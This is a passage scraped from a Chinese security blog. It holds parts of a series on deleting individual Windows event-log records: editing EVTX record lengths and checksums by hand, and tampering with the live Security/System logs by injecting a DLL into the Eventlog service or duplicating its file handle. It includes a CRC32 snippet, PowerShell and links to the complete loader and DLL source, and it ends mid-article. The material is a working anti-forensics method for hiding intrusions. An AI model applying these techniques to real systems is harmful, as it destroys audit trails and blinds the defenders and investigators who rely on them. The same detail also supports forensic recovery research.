    FiletimeTypeNode(offset=0x8a) --&gt; 2018-06-04 07:21:19.394281
    NullTypeNode(offset=0x92)
    UnsignedDwordTypeNode(offset=0x92) --&gt; 472
    UnsignedDwordTypeNode(offset=0x96) --&gt; 1948
    UnsignedQwordTypeNode(offset=0x9a) --&gt; 1915
    UnsignedByteTypeNode(offset=0xa2) --&gt; 0
    NullTypeNode(offset=0xa3)
    NullTypeNode(offset=0xa3)
    NullTypeNode(offset=0xa3)
    NullTypeNode(offset=0xa3)
    NullTypeNode(offset=0xa3)
    NullTypeNode(offset=0xa3)
    NullTypeNode(offset=0xa3)
    BXmlTypeNode(offset=0xa3) --&gt;
      RootNode(offset=0xa3)
        StreamStartNode(offset=0xa3)
        TemplateInstanceNode(offset=0xa7, resident=False)
        Substitutions(offset=0xb1)
          WstringTypeNode(offset=0xc5) --&gt; Background Intelligent Transfer Servi
ce
          WstringTypeNode(offset=0x113) --&gt; 正在运行
          UnsignedDwordTypeNode(offset=0x11b) --&gt; 14
          BinaryTypeNode(offset=0x11f) --&gt; QgBJAFQAUwAvADQAAAA=


&lt;Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"&gt;&lt;System&gt;&lt;Pr
ovider Name="Service Control Manager" Guid="{555908d1-a6d7-4695-8e1e-26931d2012f
4}" EventSourceName="Service Control Manager"&gt;&lt;/Provider&gt;
&lt;EventID Qualifiers="16384"&gt;7036&lt;/EventID&gt;
&lt;Version&gt;0&lt;/Version&gt;
&lt;Level&gt;4&lt;/Level&gt;
&lt;Task&gt;0&lt;/Task&gt;
&lt;Opcode&gt;0&lt;/Opcode&gt;
&lt;Keywords&gt;0x8080000000000000&lt;/Keywords&gt;
&lt;TimeCreated SystemTime="2018-06-04 07:21:19.394281"&gt;&lt;/TimeCreated&gt;
&lt;EventRecordID&gt;1915&lt;/EventRecordID&gt;
&lt;Correlation ActivityID="" RelatedActivityID=""&gt;&lt;/Correlation&gt;
&lt;Execution ProcessID="472" ThreadID="1948"&gt;&lt;/Execution&gt;
&lt;Channel&gt;System&lt;/Channel&gt;
&lt;Computer&gt;WIN-E8C6J8CN50O&lt;/Computer&gt;
&lt;Security UserID=""&gt;&lt;/Security&gt;
&lt;/System&gt;
&lt;EventData&gt;&lt;Data Name="param1"&gt;Background Intelligent Transfer Service&lt;/Data&gt;
&lt;Data Name="param2"&gt;&amp;#27491;&amp;#22312;&amp;#36816;&amp;#34892;&lt;/Data&gt;
&lt;Binary&gt;QgBJAFQAUwAvADQAAAA=&lt;/Binary&gt;
&lt;/EventData&gt;
&lt;/Event&gt;
</code></pre></div></div>

<h2 id="0x03-删除单条日志的思路">0x03 删除单条日志的思路</h2>
<hr>

<p>Windows系统在解析日志文件时，通过Event Record的Size长度逐个读取每一条日志的内容</p>

<p>如果修改某条日志的长度，使长度覆盖下一条日志，那么Windows系统在解析时，就会跳过下一条日志，相当于下一条日志被隐藏</p>

<p>DanderSpritz中的eventlogedit就是这个思路，只修改了长度，没有删除日志内容</p>

<p>实现思路如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-1/2-2.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>图片来自https://blog.fox-it.com/2017/12/08/detection-and-recovery-of-nsas-covered-up-tracks/</p>

<p>所以如果恢复每条日志的正确日志长度，就能够恢复出被隐藏的日志，恢复工具可使用如下python脚本：</p>

<p>https://github.com/fox-it/danderspritz-evtx</p>

<p>当然，如果以此为基础，把指定日志的内容清空，就能够实现真正的日志删除</p>

<p>为了保证修改后的日志文件能够被正确识别，还需要修改多个标志位，重新计算校验和</p>

<p>具体修改方法如下：</p>

<ol>
  <li>File header中的Next record identifier值减1</li>
  <li>重新计算File header中的Checksum</li>
  <li>修改Event Record:重新计算待删除Event Record前后长度，更新后续Event Record的Event record identifier</li>
  <li>更新ElfChuk，修改如下内容：
    <ul>
      <li>Last event record number</li>
      <li>Last event record identifier</li>
      <li>Last event record data offset</li>
      <li>Event records checksum</li>
      <li>Checksum</li>
    </ul>
  </li>
</ol>

<h2 id="0x04-删除单条日志的实例">0x04 删除单条日志的实例</h2>
<hr>

<p>测试文件： System.evtx</p>

<p>下载地址：</p>

<p>https://github.com/3gstudent/Eventlogedit-evtx–Evolution/blob/master/System.evtx</p>

<p>文件包含4条日志，下面演示如何删除第4条日志</p>

<p>第4条日志内容如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-1/3-1.png" alt="Alt text"></p>

<p>EventRecordID为1915</p>

<h3 id="1file-header中的next-record-identifier值减1">1、File header中的Next record identifier值减1</h3>

<p>File header位于文件最开始的部分</p>

<p>Next record identifier的偏移为24(0x18h)，长度8</p>

<p>对应测试文件System.evtx，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-1/3-2.png" alt="Alt text"></p>

<p>Next record identifier为0x77Ch,即1916</p>

<p>减1后为1915，即0x77Bh</p>

<h3 id="2重新计算file-header中的checksum">2、重新计算File header中的Checksum</h3>

<p>计算方法： 前120字节做CRC32运算，偏移为124(0x7Ch)，长度4</p>

<p>修改Next record identifier后的内容如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-1/3-3.png" alt="Alt text"></p>

<p>前120字节的内容为<code class="language-plaintext highlighter-rouge">456C6646696C6500000000000000000000000000000000007B0700000000000080000000010003000010010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</code></p>

<p>计算CRC32可使用如下python代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import binascii   
def crc2hex(crc):   
    return '%08x' % (binascii.crc32(binascii.a2b_hex(crc)) &amp; 0xffffffff)     
d='456C6646696C6500000000000000000000000000000000007B0700000000000080000000010003000010010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'  
print(crc2hex(d))  
</code></pre></div></div>

<p>输出结果<code class="language-plaintext highlighter-rouge">ccc94756</code></p>

<p>所以更新后的内容为<code class="language-plaintext highlighter-rouge">56 47 C9 CC</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-1/3-4.png" alt="Alt text"></p>

<h3 id="3修改event-record">3、修改Event Record</h3>

<p>通过搜索magic string <code class="language-plaintext highlighter-rouge">0x2A 0x2A 0x00 0x00</code>定位不同的Event Record</p>

<p>第四条Event Record的内容如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-1/3-5.png" alt="Alt text"></p>

<p>长度为0x138h</p>

<p>Event record identifier为0x77Bh</p>

<p>第三条Event Record的内容如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-1/3-6.png" alt="Alt text"></p>

<p>长度为0x480h</p>

<p>Event record identifier为0x77Ah</p>

<p>修改第三条Event Record的长度，使其覆盖第四条Event Record</p>

<p>新长度为0x138h+0x480h=0x5B8h</p>

<p>由于是删除最后一条日志，所以不需要更新Event record identifier(共有两个位置)</p>

<p><strong>注：</strong></p>

<p>修改长度的位置有两个，分别为第三条日志的长度和第四条日志的最尾部</p>

<p>修改后如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-1/3-7.png" alt="Alt text"></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-1/3-8.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>本次测试只修改了Event Record的长度，后续可通过修复长度还原日志</p>

<p>当然可以选择将日志内容清空，实现永久删除</p>

<h3 id="4更新elfchuk">4、更新ElfChuk</h3>

<p>搜索magic string <code class="language-plaintext highlighter-rouge">ElfChuk</code></p>

<p><strong>注：</strong></p>

<p>有可能有多个ElfChuk，需要找到对应的ElfChuk</p>

<p>测试文件System.evtx只有一个ElfChuk</p>

<p>内容如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-1/4-1.png" alt="Alt text"></p>

<p>Last event record number为0x4h</p>

<p>Last event record identifier为0x77Bh</p>

<p>Last event record data offset为0x1248h</p>

<p>Event records checksum为0xD3D3DE43h</p>

<p>Checksum为0xEB4C47BFh</p>

<p>需要做如下修改：</p>

<p>Last event record number减1，为0x3h</p>

<p>Last event record identifier减1，为0x77Ah</p>

<p>Last event record data offset为第三条Event Record相对于ElfChuk的偏移长度，为0xDC8h</p>

<p>Event records checksum为所有Event records内容的CRC32校验和，包含3条日志内容，使用python脚本计算后，结果为0xF92FEDB9h</p>

<p>Checksum为ElfChuk中0-120和128-512这些内容的CRC32校验和，结果为0x3CE0BF8h</p>

<p>更新后，内容如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-1/4-2.png" alt="Alt text"></p>

<p>保存为新文件System2.evtx</p>

<p>下载地址：</p>

<p>https://github.com/3gstudent/Eventlogedit-evtx–Evolution/blob/master/System2.evtx</p>

<p><strong>注：</strong></p>

<p>为了验证trailing empty values，我将第四条日志后的内容全部覆盖为0x41(字符A)，不影响日志文件的有效性</p>

<p>System2.evtx被成功识别，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-1/4-3.png" alt="Alt text"></p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文介绍了基础知识和删除单条日志的实现思路，实例演示如何修改evtx文件，隐藏最后一条日志</p>

<p>下一篇将要介绍如何编写程序实现自动删除指定日志</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on June  1, 2018
  </div>

  
</article><article class="post">
  <h1>Windows XML Event Log (EVTX)单条日志清除（四）——通过注入获取日志文件句柄删除当前系统单条日志记录</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Windows XML Event Log (EVTX)单条日志清除系列文章的第四篇，介绍第二种删除当前系统单条日志记录的方法：获得日志服务Eventlog对应进程中指定日志文件的句柄，通过Dll注入获得该句柄的操作权限，利用该句柄实现日志文件的修改</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>利用思路</li>
  <li>程序实现</li>
  <li>枚举日志服务Eventlog对应进程的所有句柄，获得指定日志文件的句柄</li>
  <li>通过Dll注入获得该句柄的操作权限</li>
  <li>进程间消息传递的方法</li>
</ul>

<h2 id="0x02-利用思路">0x02 利用思路</h2>
<hr>

<p>系统启动日志服务Eventlog后，会以独占模式打开日志文件，导致其他进程无法打开该日志文件，也就无法进行修改操作</p>

<p>那么，如果我们通过Dll注入进入进程的内存，接着获得指定日志文件的句柄，能否获得该日志文件的操作权限呢？</p>

<h2 id="0x03-枚举日志服务eventlog对应进程的所有句柄获得指定日志文件的句柄">0x03 枚举日志服务Eventlog对应进程的所有句柄，获得指定日志文件的句柄</h2>
<hr>

<h3 id="1利用工具processhacker获得指定日志文件的句柄">1、利用工具processhacker获得指定日志文件的句柄</h3>

<p>下载地址：</p>

<p>https://processhacker.sourceforge.io/</p>

<h4 id="1获得日志服务eventlog对应进程的pid">(1)获得日志服务Eventlog对应进程的pid</h4>

<p>执行如下powershell代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-WmiObject -Class win32_service -Filter "name = 'eventlog'" | select -exp ProcessId
</code></pre></div></div>

<h4 id="2运行processhacker">(2)运行processhacker</h4>

<p>根据pid找到进程，查看<code class="language-plaintext highlighter-rouge">Properties</code>-&gt;<code class="language-plaintext highlighter-rouge">Handles</code></p>

<p>能够获得当前进程的所有句柄信息</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-19/2-1.png" alt="Alt text"></p>

<p>可以看到<code class="language-plaintext highlighter-rouge">C:\Windows\System32\winevt\Logs\Security.evtx</code>对应的Handle值为<code class="language-plaintext highlighter-rouge">0x1c8</code></p>

<h3 id="2通过c程序实现获得指定日志文件的句柄">2、通过c++程序实现获得指定日志文件的句柄</h3>

<p>查看processhacker的源码，寻找实现方法</p>

<p>代码位置：</p>

<p>https://github.com/processhacker/processhacker/blob/e2d793289dede80f6e3bda26d6478dc58b20b7f8/ProcessHacker/hndlprv.c#L307</p>

<p>获得参考资料：</p>

<blockquote>
  <ul>
    <li>On Windows 8 and later, NtQueryInformationProcess with ProcessHandleInformation is the most efficient method.</li>
    <li>On Windows XP and later, NtQuerySystemInformation with SystemExtendedHandleInformation.</li>
    <li>Otherwise, NtQuerySystemInformation with SystemHandleInformation can be used.</li>
  </ul>
</blockquote>

<p>于是，挑选第三个方法尝试实现</p>

<p><strong>注：</strong></p>

<p>经测试，第三个方法适用于Win7和更新版本的操作系统</p>

<p>利用NtQuerySystemInformation查询SystemHandleInformation能够获得所有进程的句柄信息</p>

<p>挑选出日志进程中的所有句柄</p>

<p>接着通过NtDuplicateObject获取句柄的名称和具体的数值信息</p>

<p>最后筛选出想要查找的句柄，输出Handle值</p>

<p>完整实现代码已开源，下载地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/GetPIDandHandle(evtx).cpp</p>

<p>代码实现了根据输入的关键词进行搜索，获得对应的句柄名称和Handle值</p>

<p>测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-19/2-2.png" alt="Alt text"></p>

<p>成功获得日志服务Eventlog对应进程的pid，security.evtx对应的Handle值为<code class="language-plaintext highlighter-rouge">0x1c8</code></p>

<h2 id="0x04-通过dll注入获得该句柄的操作权限">0x04 通过Dll注入获得该句柄的操作权限</h2>
<hr>

<p>通过NtCreateThreadEx + LdrLoadDll实现Dll注入的代码可参考：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/NtCreateThreadEx%20%2B%20LdrLoadDll.cpp</p>

<p><strong>注:</strong></p>

<p>注入成功后需要FreeDll</p>

<p>注入成功后，使用获得到的Handle值作为函数CreateFileMapping()的第一个参数，创建一个文件映射内核对象</p>

<p>然后调用函数MapViewOfFile()将文件数据映射到进程的地址空间</p>

<p>接下来修改内存中的数据，删除单条日志记录</p>

<p>最后调用函数FlushViewOfFile()，将内存数据写入磁盘</p>

<h2 id="0x05-进程间消息传递的方法">0x05 进程间消息传递的方法</h2>
<hr>

<p>在实际使用过程中，整个实现日志记录删除功能的代码要放在Dll中，而通过CreateRemoteThread无法向Dll传入参数，这就导致无法删除指定EventlogRecordId的日志</p>

<p>这里可以借助进程间的消息传递</p>

<p>实现方法有多种，例如信号、管道、消息队列和共享内存，甚至是读写文件</p>

<p>由于在<strong>0x04</strong>部分使用了函数CreateFileMapping()创建一个文件映射内核对象，所以进程间消息传递也使用内存映射的方式</p>

<p>创建一个共享内存，代码可参考：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/OpenFileMapping.cpp</p>

<p>代码中创建了两个内存映射对象，并且指定了函数CreateFileMapping()的访问权限为允许任何人访问该对象，即函数CreateFileMapping()的第二个参数</p>

<p>通常情况下，该值设置为NULL，表示默认访问权限，但在注入的Dll中必须设置为允许任何人访问该对象，否则提示拒绝访问</p>

<p><strong>原因如下：</strong></p>

<p>Dll注入svchost.exe后，权限为System，默认访问权限无法访问由用户创建的内存映射文件对象，必须指定为允许任何人访问该对象</p>

<p>当然，如果是两个用户权限的进程进行消息传递，函数CreateFileMapping()的第二个参数为NULL即可</p>

<p>读取指定共享内存，代码可参考：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/OpenFileMapping.cpp</p>

<p>代码中读取这两个内存映射对象，添加了数据类型转换的功能(字符串转int)</p>

<h2 id="0x06-程序实现流程">0x06 程序实现流程</h2>
<hr>

<h3 id="1自己解析格式实现日志删除">1、自己解析格式，实现日志删除</h3>

<p>删除的关键代码如下：</p>

<p>https://github.com/3gstudent/Eventlogedit-evtx–Evolution/blob/master/DeleteRecordofFile.cpp</p>

<p>代码实现了删除文件<code class="language-plaintext highlighter-rouge">c:\test\Setup.evtx</code>中的一条日志(EventRecordID=14)，新文件保存为<code class="language-plaintext highlighter-rouge">c:\test\SetupNew.evtx</code></p>

<p>整个实现流程分成两部分：</p>

<ul>
  <li>启动程序</li>
  <li>注入的Dll</li>
</ul>

<h4 id="1启动程序loader-rewritingcpp">1.启动程序(Loader-rewriting.cpp)</h4>

<p>代码地址：</p>

<p>https://github.com/3gstudent/Eventlogedit-evtx–Evolution/blob/master/Loader-rewriting.cpp</p>

<p>流程如下：</p>

<ol>
  <li>获得日志服务Eventlog对应进程的pid</li>
  <li>枚举日志服务Eventlog对应进程的的所有句柄，获得指定日志文件的句柄</li>
  <li>创建两个内存映射，用于向dll传递日志文件的句柄和需要删除日志的EventRecordID</li>
  <li>向日志服务Eventlog对应的进程注入Dll</li>
  <li>释放Dll</li>
  <li>关闭内存映射</li>
</ol>

<h4 id="2注入的dlldll-rewritingcpp">2.注入的Dll(Dll-rewriting.cpp)</h4>

<p>代码地址：</p>

<p>https://github.com/3gstudent/Eventlogedit-evtx–Evolution/blob/master/Dll-rewriting.cpp</p>

<p>流程如下：</p>

<ol>
  <li>分别从两个内存映射读取消息，将读取到的内容从字符串转换成int类型，获得日志文件的句柄及需要删除日志的EventRecordID</li>
  <li>调用函数CreateFileMapping()，传入日志文件的句柄，创建一个文件映射内核对象</li>
  <li>调用函数MapViewOfFile()将文件数据映射到进程的地址空间</li>
  <li>修改内存数据，删除指定日志</li>
  <li>调用函数FlushViewOfFile()，将内存数据写入磁盘</li>
  <li>关闭日志文件的内存映射</li>
</ol>

<p>测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-19/3-1.png" alt="Alt text"></p>

<h3 id="2使用winapi-evtexportlog过滤出想要删除的内容">2、使用WinAPI EvtExportLog，过滤出想要删除的内容</h3>

<p>可供参考的代码：</p>

<p>https://github.com/360-A-Team/EventCleaner/blob/master/EventCleaner/EventCleaner.cpp#L528</p>

<p>我按照这个思路写的代码：</p>

<p>https://github.com/3gstudent/Eventlogedit-evtx–Evolution/blob/master/DeleteRecordofFileEx.cpp</p>

<p>代码实现了调用Windows API EvtExportLog对日志文件进行筛选，去除指定日志后，将剩下的日志内容保存为新文件temp.evtx</p>

<p>整个实现流程分成三部分：</p>

<ul>
  <li>日志删除程序</li>
  <li>启动程序</li>
  <li>注入的Dll</li>
</ul>

<h4 id="1日志删除程序deleterecord-evtexportlogcpp">1.日志删除程序(DeleteRecord-EvtExportLog.cpp)</h4>

<p>代码地址：</p>

<p>https://github.com/3gstudent/Eventlogedit-evtx–Evolution/blob/master/DeleteRecord-EvtExportLog.cpp</p>

<p>流程如下：</p>

<ol>
  <li>指定日志文件和需要删除日志的EventRecordID</li>
  <li>生成新的日志文件temp.evtx</li>
</ol>

<h4 id="2启动程序loader-evtexportlogcpp">2.启动程序(Loader-EvtExportLog.cpp)</h4>

<p>代码地址：</p>

<p>https://github.com/3gstudent/Eventlogedit-evtx–Evolution/blob/master/Loader-EvtExportLog.cpp</p>

<p>流程如下：</p>

<ol>
  <li>获得日志服务Eventlog对应进程的pid</li>
  <li>枚举日志服务Eventlog对应进程的的所有句柄，获得指定日志文件的句柄</li>
  <li>创建三个内存映射，用于向dll传递日志文件的句柄、新日志文件的长度和新日志文件的内容</li>
  <li>向日志服务Eventlog对应的进程注入Dll</li>
  <li>释放Dll</li>
  <li>关闭内存映射</li>
</ol>

<h4 id="3注入的dlldll-evtexportlogcpp">3.注入的Dll(Dll-EvtExportLog.cpp)</h4>

<p>代码地址：</p>

<p>https://github.com/3gstudent/Eventlogedit-evtx–Evolution/blob/master/Dll-EvtExportLog.cpp</p>

<p>流程如下：</p>

<ol>
  <li>从第一个内存映射获得日志文件的句柄，将读取到的内容从字符串转换成int类型</li>
  <li>从第二个内存映射获得新日志文件的长度</li>
  <li>根据新日志文件的长度调整内存映射的读取长度，从第三个内存映射获得新日志文件的内容</li>
  <li>调用函数CreateFileMapping()，传入日志文件的句柄，创建一个文件映射内核对象</li>
  <li>调用函数MapViewOfFile()将文件数据映射到进程的地址空间</li>
  <li>修改内存数据，覆盖为新日志文件的内容</li>
  <li>调用函数FlushViewOfFile()，将内存数据写入磁盘</li>
  <li>关闭日志文件的内存映射</li>
</ol>

<p>测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-6-19/3-2.png" alt="Alt text"></p>

<p><strong>注:</strong></p>

<p>对于以上两种方法，删除<code class="language-plaintext highlighter-rouge">setup.evtx</code>是没有问题的，删除<code class="language-plaintext highlighter-rouge">system.evtx</code>和<code class="language-plaintext highlighter-rouge">security.evtx</code>会存在因为竞争条件导致删除失败的情况</p>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文介绍了第二种删除当前系统单条日志记录的方法：获得日志服务Eventlog对应进程中指定日志文件的句柄，通过Dll注入获得权限，利用该句柄实现日志文件的修改
某些情况下，dll注入会失败，那么是否还有删除当前系统单条日志记录的方法呢？下一篇文章将会介绍</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on June 19, 2018
  </div>

  
</article><article class="post">
  <h1>Windows Event Viewer Log (EVT)单条日志清除（三）——删除当前系统指定指定时间段evt日志记录</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Windows Event Viewer Log (EVT)单条日志清除系列文章的第三篇，介绍删除当前系统指定时间段evt日志记录的方法和详细测试过程，说明无法修改日志数量的原因，最后开源查询日志内容和修改日志内容的实现代码</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>XP系统下枚举系统所有句柄的方法</li>
  <li>筛选日志文件句柄的条件</li>
  <li>XP下Dll注入的实例代码</li>
  <li>实际测试过程</li>
  <li>无法修改日志数量的原因</li>
  <li>日志查询的程序实现细节</li>
  <li>日志修改的程序实现细节</li>
</ul>

<h2 id="0x02-xp系统下枚举系统所有句柄">0x02 XP系统下枚举系统所有句柄</h2>
<hr>

<p>之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%BA%94-%E9%80%9A%E8%BF%87DuplicateHandle%E8%8E%B7%E5%8F%96%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8F%A5%E6%9F%84%E5%88%A0%E9%99%A4%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9F%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/">《Windows单条日志清除（五）——通过DuplicateHandle获取日志文件句柄删除当前系统单条日志记录》</a>介绍了Win8及以上系统的实现方法：</p>

<ol>
  <li>利用NtQuerySystemInformation查询SystemHandleInformation能够获得所有进程的句柄信息</li>
  <li>通过NtDuplicateObject获取句柄的名称和具体的数值信息</li>
  <li>筛选出想要查找的句柄</li>
  <li>通过DuplicateHandle复制句柄</li>
  <li>获得修改日志文件的权限</li>
</ol>

<p>在XP系统下，无法使用NtQuerySystemInformation查询SystemHandleInformation获得进程的句柄信息</p>

<p>参考processhacker的源码，寻找实现方法</p>

<p>代码位置：</p>

<p>https://github.com/processhacker/processhacker/blob/e2d793289dede80f6e3bda26d6478dc58b20b7f8/ProcessHacker/hndlprv.c#L307</p>

<p>获得参考资料：</p>

<blockquote>
  <p>On Windows 8 and later, NtQueryInformationProcess with ProcessHandleInformation is the most efficient method.
On Windows XP and later, NtQuerySystemInformation with SystemExtendedHandleInformation.
Otherwise, NtQuerySystemInformation with SystemHandleInformation can be used.</p>
</blockquote>

<p>尝试第二种，使用NtQuerySystemInformation查询SystemExtendedHandleInformation</p>

<p><strong>注：</strong></p>

<p>第二种方法支持WinXP及更高版本的系统</p>

<h2 id="0x03-筛选出指定日志文件的句柄">0x03 筛选出指定日志文件的句柄</h2>
<hr>

<h3 id="1筛选出类型为文件的句柄">1、筛选出类型为文件的句柄</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ObjectTypeNumber = 0x1c
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>Win8及更高版本的系统，<code class="language-plaintext highlighter-rouge">ObjectTypeNumber = 0x1e</code></p>

<p>WinXP和Win7系统，<code class="language-plaintext highlighter-rouge">ObjectTypeNumber = 0x1c</code></p>

<h3 id="2过滤出有可能导致挂起的句柄">2、过滤出有可能导致挂起的句柄</h3>

<p>通过API WaitForSingleObject进行判断</p>

<p>否则将导致进程挂起</p>

<h3 id="3缩小范围指定文件属性">3、缩小范围，指定文件属性</h3>

<p>日志文件的属性固定，<code class="language-plaintext highlighter-rouge">handle-&gt;GrantedAccess = 0x0012019f</code></p>

<p>完整实现代码已开源，下载地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/GetPIDandHandle(evt).cpp</p>

<p>代码实现了根据输入的关键词进行搜索，获得对应的句柄名称和Handle值</p>

<h2 id="0x04-日志删除的实现方法1通过dll注入获得句柄操作权限">0x04 日志删除的实现方法1：通过Dll注入获得句柄操作权限</h2>
<hr>

<p>向系统进程注入dll，dll文件即可获取日志文件的句柄</p>

<p>接下来的操作为：</p>

<ol>
  <li>调用函数CreateFileMapping()创建一个文件映射内核对象</li>
  <li>调用函数MapViewOfFile()将文件数据映射到进程的地址空间</li>
  <li>修改内存中的数据，删除指定日志记录</li>
  <li>调用函数FlushViewOfFile()，将内存数据写入磁盘</li>
  <li>清除内存映射对象</li>
</ol>

<p>完整的实现过程可参考之前介绍删除evtx文件单条日志的文章<a href="https://3gstudent.github.io/3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E5%9B%9B-%E9%80%9A%E8%BF%87%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8F%A5%E6%9F%84%E5%88%A0%E9%99%A4%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9F%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/">《Windows XML Event Log (EVTX)单条日志清除（四）——通过注入获取日志文件句柄删除当前系统单条日志记录》</a></p>

<p>xp系统下无法使用NtCreateThreadEx + LdrLoadDll的方式注入dll，可以直接调用CreateRemoteThread</p>

<p>实现代码可参考：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/CreateRemoteThread.cpp</p>

<h2 id="0x05-日志删除的实现方法2通过duplicatehandle获得句柄操作权限">0x05 日志删除的实现方法2：通过DuplicateHandle获得句柄操作权限</h2>
<hr>

<p>参考之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%BA%94-%E9%80%9A%E8%BF%87DuplicateHandle%E8%8E%B7%E5%8F%96%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8F%A5%E6%9F%84%E5%88%A0%E9%99%A4%E5%BD%93%E5%89%8D%E7%B3%BB%E7%BB%9F%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/">《Windows XML Event Log (EVTX)单条日志清除（五）——通过DuplicateHandle获取日志文件句柄删除当前系统单条日志记录》</a></p>

<p>筛选出句柄后，再次调用NtDuplicateObject获得实句柄，对日志文件进行删除操作</p>

<p>同样，需要以下操作：</p>

<ol>
  <li>调用函数CreateFileMapping()创建一个文件映射内核对象</li>
  <li>调用函数MapViewOfFile()将文件数据映射到进程的地址空间</li>
  <li>修改内存中的数据，删除指定日志记录</li>
  <li>调用函数FlushViewOfFile()，将内存数据写入磁盘</li>
  <li>清除内存映射对象</li>
</ol>

<p>日志删除部分可参考之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/Windows-Event-Viewer-Log-(EVT)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%BA%8C-%E7%A8%8B%E5%BA%8F%E5%AE%9E%E7%8E%B0%E5%88%A0%E9%99%A4evt%E6%96%87%E4%BB%B6%E6%8C%87%E5%AE%9A%E6%97%B6%E9%97%B4%E6%AE%B5%E7%9A%84%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/">《Windows Event Viewer Log (EVT)单条日志清除（二）——程序实现删除evt文件指定时间段的日志记录》</a></p>

<p>这里给出一个完整的实现代码：</p>

<p>https://github.com/3gstudent/Eventlogedit-evt–General/blob/master/evtDeleteRecordbyGetHandle.cpp</p>

<p>代码实现了删除指定evt文件中，某一时间段的多条日志，并且生成调试文件sys2.evt和sys3.evt</p>

<p>sys2.evt保存删除日志后的数组内容</p>

<p>sys3.evt保存映射到内存中的内容</p>

<p>程序执行后，sys2.evt和sys3.evt成功删除指定日志，但是当前系统的日志文件产生错误</p>

<p>为了对比测试，我将删除的时间段调整为当前日志以外的数值，即不会删除任何日志，程序执行后，当前系统的日志文件正常</p>

<p>更进一步，只要不改变日志的个数，修改日志的内容，当前系统的日志文件仍正常</p>

<p>这里得出一个结论：<strong>无法通过获得日志文件句柄修改内存数据的方式改变日志的数目</strong></p>

<p>同样，通过ProcessHacker直接修改内存文件的File header也无法改变日志的数目</p>

<p>编写程序验证，通过API GetNumberOfEventLogRecords查询日志个数</p>

<p>c代码如下：</p>

